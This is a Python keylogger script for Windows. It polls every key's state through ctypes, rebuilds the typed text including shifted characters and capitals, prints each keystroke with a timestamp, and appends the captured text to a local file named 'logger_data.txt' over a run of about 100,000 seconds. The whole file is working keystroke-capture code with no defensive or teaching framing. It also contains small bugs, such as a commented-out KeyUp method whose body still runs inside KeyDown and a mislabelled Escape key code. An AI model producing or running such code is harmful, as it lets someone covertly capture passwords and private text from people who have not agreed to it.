import threading, time
from ctypes import *

class Thread():
    def __init__(self, addressOf, args):
        self.terminate = False
        self.Instance = threading.Thread(target=addressOf, args=args)
        self.Instance.daemon = True
        self.Instance.start()

VKStr = {}
VKStr[0x01] = "LEFT_MOUSEE"
VKStr[0x02] = "RIGHT_MOUSE"
VKStr[0x03] = "MIDDLE_MOUSE"
VKStr[0x08] = "BACKSPACE"
VKStr[0x09] = "TAB"
VKStr[0x0D] = "ENTER"
VKStr[0x10] = "SHIFT"
VKStr[0x11] = "CTRL"
VKStr[0x12] = "ALT"
VKStr[0x14] = "CAPSLOCK"
VKStr[0x18] = "ESCAPE"
VKStr[0x20] = " "
VKStr[0x25] = "LEFT_ARROW"
VKStr[0x26] = "UP_ARROW"
VKStr[0x27] = "RIGHT_ARROW"
VKStr[0x28] = "DOWN_ARROW"
VKStr[0x2C] = "PRINT_SCREEN"
VKStr[0x30] = "0"
VKStr[0x31] = "1"
VKStr[0x32] = "2"
VKStr[0x33] = "3"
VKStr[0x34] = "4"
VKStr[0x35] = "5"
VKStr[0x36] = "6"
VKStr[0x37] = "7"
VKStr[0x38] = "8"
VKStr[0x39] = "9"
VKStr[0x41] = "a"
VKStr[0x42] = "b"
VKStr[0x43] = "c"
VKStr[0x44] = "d"
VKStr[0x45] = "e"
VKStr[0x46] = "f"
VKStr[0x47] = "g"
VKStr[0x48] = "h"
VKStr[0x49] = "i"
VKStr[0x4A] = "j"
VKStr[0x4B] = "k"
VKStr[0x4C] = "l"
VKStr[0x4D] = "m"
VKStr[0x4E] = "n"
VKStr[0x4F] = "o"
VKStr[0x50] = "p"
VKStr[0x51] = "q"
VKStr[0x52] = "r"
VKStr[0x53] = "s"
VKStr[0x54] = "t"
VKStr[0x55] = "u"
VKStr[0x56] = "v"
VKStr[0x57] = "w"
VKStr[0x58] = "x"
VKStr[0x59] = "y"
VKStr[0x5A] = "z"

VKStr[0x70] = "F1 Key"
VKStr[0x71] = "F2 Key"
VKStr[0x72] = "F3 Key"
VKStr[0x73] = "F4 Key"
VKStr[0x74] = "F5 Key"
VKStr[0x75] = "F6 Key"
VKStr[0x76] = "F7 Key"
VKStr[0x77] = "F8 Key"
VKStr[0x78] = "F9 Key"
VKStr[0x79] = "F10 Key"
VKStr[0x7A] = "F11 Key"
VKStr[0x7B] = "F12 Key"
VKStr[0x7C] = "F13 Key"
VKStr[0x7D] = "F14 Key"
VKStr[0x7E] = "F15 Key"
VKStr[0x7F] = "F16 Key"
VKStr[0x80] = "F17 Key"
VKStr[0x81] = "F18 Key"
VKStr[0x82] = "F19 Key"
VKStr[0x83] = "F20 Key"
VKStr[0x84] = "F21 Key"
VKStr[0x85] = "F22 Key"
VKStr[0x86] = "F23 Key"
VKStr[0x87] = "F24 Key"


ShiftEquivs={}
ShiftEquivs[0x30] = ")"
ShiftEquivs[0x31] = "!"
ShiftEquivs[0x32] = "\""
ShiftEquivs[0x33] = "£"
ShiftEquivs[0x34] = "$"
ShiftEquivs[0x35] = "%"
ShiftEquivs[0x36] = "^"
ShiftEquivs[0x37] = "&"
ShiftEquivs[0x38] = "*"
ShiftEquivs[0x39] = "("

ActiveKeys = {}

def StringToVK(string):
    for key, value in VKStr.items():
        if value == string:
            return key

def VKToString(VK):
    return VKStr[VK]

def IsKeyPressed(VK_KEYCODE):
    if type(VK_KEYCODE) == str:
        try:
            VK_KEYCODE = StringToVK(VK_KEYCODE)
        except:
            raise Exception("Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid")
            return

    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x8000 != 0

def IsKeyToggled(VK_KEYCODE):
    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x0001 != 0

class KeyTracker:
    def __init__(self):
        self.tracking = False
        self.tracked_string_concat = ""
        self.file_open = False

    def StartTracking(self):
        self.tracking = True

    def StopTracking(self):
        self.tracking = False
        self.CompileData()

    def KeyDown(self, key):
        str_old = self.tracked_string_concat
        if self.tracking and VKToString(key) != "SHIFT":
            if IsKeyToggled(StringToVK("CAPSLOCK")):
                self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
            elif IsKeyPressed(StringToVK("SHIFT")):
                shiftEquiv = False
                try:
                    ShiftEquivs[key]
                    shiftEquiv = True
                except:
                    pass

                if shiftEquiv:
                    self.tracked_string_concat = self.tracked_string_concat + ShiftEquivs[key]
                else:
                    self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
            else:
                self.tracked_string_concat = self.tracked_string_concat + VKToString(key)
            print(self.tracked_string_concat.replace(str_old, ""), time.time())

    # def KeyUp(self, key):
        str_old = self.tracked_string_concat
        if self.tracking and VKToString(key) == "SHIFT":
            self.tracked_string_concat = self.tracked_string_concat + VKToString(key)
            print(self.tracked_string_concat.replace(str_old, ""), time.time())
            pass

    def UpdateKeyState(self, key, state):  
        def SetKeyState(key, state):
            ActiveKeys[key] = state
            if state == True:
                self.KeyDown(key)
            # elif state == False:
            #     self.KeyUp(key)

        keyExists = False
        try:
            ActiveKeys[key]
            keyExists = True
        except:
            pass

        if keyExists:
            if ActiveKeys[key] != state:
                SetKeyState(key, state)
        else:
            SetKeyState(key, state)

    def CompileData(self):
        try:
            file = open("logger_data.txt", "a")
            file.write("\n")
            file.write("-"*15)
            file.write("\n")
            file.write(self.tracked_string_concat)
            file.close()
        except:
            pass

    def TrackData(self, time_length): #timeLength in seconds
        KeyTracker.StartTracking()
        time.sleep(time_length)
        KeyTracker.StopTracking()

KeyTracker = KeyTracker()
t = Thread(KeyTracker.TrackData, [100000])
while True:
    for key, key_name in VKStr.items():
        KeyTracker.UpdateKeyState(key, IsKeyPressed(key))